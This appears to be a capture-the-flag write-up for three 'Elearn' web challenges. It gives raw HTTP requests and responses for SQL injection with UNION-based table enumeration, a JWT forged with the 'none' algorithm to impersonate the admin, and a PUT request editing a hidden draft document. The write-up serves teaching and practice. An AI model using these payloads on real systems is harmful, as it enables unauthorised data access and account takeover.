# Elearn (4 challenges)

### Summary
1. SQLi on API endpoint -> Flag
2. Broken Access Control via Improper Verification of JWT -> Flag
3. Admin Privileges -> PUT Access to API Endpoint -> Flag
4. ???

# Elearn (1/4) - SQLi?
### Description
Recently, WhiteHacks Academy has put in a lot of effort to upgrade its elearn portal to embrace the latest web technologies. One of the end result is a whole new React web application. Everything from the login, to the search filtering are all done under-the-hood without needing a page refresh. This seamless experience has led to the overconfidence of its management to thinking that by upgrading their web stack, they're no longer vulnerable to old school web vulnerabilities such as SQL injection. Prove them wrong.
### Solution
This is SQLi - but not the workshop SQLi. You see, there are many different types of SQL databases out there, each comes with their own syntax.

This is a React App. Hence, we should use Burp even more to enumerate all those pesky endpoints which are hidden away from us. :3

SQLi often occurs in search functionality, we can try performing a search query.

``````
GET /api/modules/search/test123 HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODEyNjMsImlhdCI6MTU5NjM4MDk2MywibmJmIjoxNTk2MzgwOTYzLCJpZGVudGl0eSI6MX0._8CFBnURoNC0x2mXJnGD5RllGn8oPsJ25oc-S4k3lFM
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
We notice that our query is appended to the URL. We can try modifying the request in Burp by appending a '
``````
GET /api/modules/search/test123' HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODEyNjMsImlhdCI6MTU5NjM4MDk2MywibmJmIjoxNTk2MzgwOTYzLCJpZGVudGl0eSI6MX0._8CFBnURoNC0x2mXJnGD5RllGn8oPsJ25oc-S4k3lFM
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
We get our '500 INTERNAL SERVER ERROR' which means that this endpoint is probably SQLi vulnerable!

There is a caveat to this however, you may notice that the standard 'OR 1=1-- will still give a '500 INTERNAL SERVER ERROR'. However, its because there's a caveat to this. The syntax for comments in MySQL databases
``````
-- comment goes here
`````` 
Yep that's right! You need a space and a character after the payload. So you will have to append 'OR 1=1-- a instead! I strongly recommend for the escaping character in SQLi payloads to be '-- a' as it fits all the different types of SQL databases you will encounter!
``````
GET /api/modules/search/e 'OR 1=1-- a HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6MX0.osPzLbz-apKmy2t77ps7hRatSPK4PZTow7eSf4EWbvw
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
The rest is just simple SQLi database enumeration from there as seen from the workshop!
``````
GET /api/modules/search/e 'UNION SELECT NULL,table_name from information_schema.tables-- a 
GET /api/modules/search/e 'UNION SELECT NULL,column_name from information_schema.columns WHERE table_name='flag'-- a 
GET /api/modules/search/e 'UNION SELECT NULL,flag from flag-- a 
``````
Final response:
``````
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sun, 02 Aug 2020 15:31:01 GMT
Content-Type: application/json
Content-Length: 52
Connection: close
Access-Control-Allow-Origin: *
[{"code": null, "name": "WH2020{0Ld_5ch00l_Sql1}"}]
``````
Flag: WH2020{0Ld_5ch00l_Sql1}

# Elearn (2/4) - JWT
### Description
Another feature of a modern single page application is the lack of session cookies, which WhiteHacks Academy claims it'll prevent session hijacking and session impersonation attacks. Instead, JSON Web Token (JWT) is powering its authentication mechanism. A powerful feature of JWT is its strong digital signatures that prevents any unauthorised tampering of its data. With this, an account will be all but possible, or is it?
### Solution
JWT is being used alot more in applications lately. Lately, there was a guy who received $100,000 bounty from Apple for a JWT vulnerability (damn!) - https://bhavukjain.com/blog/2020/05/30/zeroday-signin-with-apple/

This challenge involved setting the JWT headers to "alg" : "None", this meant that the signature portion of the JWT will be redundant as there is no signature for the server to check with. If the server does not verify the JWT algorithm, we can spoof the JWT token and escalate our privileges to any user!

We can first retrieve our JWT token
``````
GET /identity HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6MX0.osPzLbz-apKmy2t77ps7hRatSPK4PZTow7eSf4EWbvw
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
The JWT token always has 3 segments. The header, payload and signature.

We can first decrypt the JWT at websites like jwt.io

``````
HEADER:
{
  "typ": "JWT",
  "alg": "HS256"
}

PAYLOAD:
{
  "exp": 1596382064,
  "iat": 1596381764,
  "nbf": 1596381764,
  "identity": 1
}
``````
So we have to modify the "alg" parameter to "None" and the "identity" parameter to another number. Luckily, JWTs are base64 encoded so we can manually decode and encode them in BurpSuite, our new JWT token will look like this. 

``````
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
``````
We can verify this by heading over to the /identity endpoint
``````
GET /identity HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
Response:
``````
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sun, 02 Aug 2020 16:02:00 GMT
Content-Type: application/json
Content-Length: 43
Connection: close
Access-Control-Allow-Origin: *
{"id":3,"name":"Admin","username":"admin"}
``````

We can then load the page with the new JWT via BurpSuite an obtain the flag.
Flag: WH2020{wh0_s@y5_5ing13_p@g3_@PP_i5nt_w3@k_t0_01d_vu1n5}

# Elearn (3/4) - UNDISCLOSED
### Description
Let's talk about the course breakdown of WhiteHacks Elearn. Each course is regarded as a module, which consists of one or more lessons. Each lesson usually has accompanying documents and slides. The thing is, in order for there to be documents for download, there needs to be an interface to upload and edit them. Also, once the document is finalised, it is put out of draft mode and becomes published. When that happens, the document cannot be edited any further besides deleting it. The site administrator insists that he/she has hidden the file editing functionality, and cannot reinstate that under any circumstances. However, your professor has a serious typo he needs to fix, and asks for your help in discovering the way to update a document on the platform.
### Solution
Whenever you load the page of the app, you will encounter alot of API endpoints being loaded (if you use Burp). An example of a particular endpoint
``````
GET /api/modules/IS200/lessons/Lesson%2001/documents/Document%2001 HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
What this does is that it queries for the contents of the document. If you actually checked the response of that:
``````
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sun, 02 Aug 2020 16:07:07 GMT
Content-Type: application/json=
Content-Length: 511
Connection: close
Access-Control-Allow-Origin: *
{"content": "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum", "name": "Document 01", "is_draft": false, "id": 1}
``````
According to our request this is not a draft endpoint. The challenge mentioned that we have to modify a draft document. Using the JWT token for admin privileges, we can  can keep on querying the documents.
``````
GET /api/modules/WRIT001/lessons/Lesson%2001/documents HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
Response:
``````
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sun, 02 Aug 2020 16:18:25 GMT
Content-Type: application/json
Content-Length: 108
Connection: close
Access-Control-Allow-Origin: *
[{"content": "NOTFLAG{youre_almost_there_try_harder}", "name": "Document Flag", "is_draft": true, "id": 2}]
``````
According to our public document at /api/modules/IS200/lessons/Lesson%2001/documents/Document%2001, the API sturcture to access the contents of a document is /api/modules/IS200/lessons/Lesson%2001/documents/<document_name>.

This means that we can access the document with /api/modules/IS200/lessons/Lesson%2001/documents/Document%20Flag. Remember we also want to modify this document. API functionality for REST API is usually modelled after CRUD
``````
C - CREATE via POST
R - READ via GET
U - UPDATE via PUT
D - DELETE via DELETE
``````
So we can try doing PUT request to edit the draft.
``````
PUT /api/modules/WRIT001/lessons/Lesson%2001/documents/Document%20Flag HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6M30.
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
Final Response:
``````
HTTP/1.1 200 OK
Server: nginx/1.19.1
Date: Sun, 02 Aug 2020 16:25:50 GMT
Content-Type: application/json
Content-Length: 52
Connection: close
Access-Control-Allow-Origin: *
{"flag": "WH2020{@cc35S_15_gr@nt3d_t0_th3_ch0sEn}"}

``````
Flag: WH2020{@cc35S_15_gr@nt3d_t0_th3_ch0sEn}
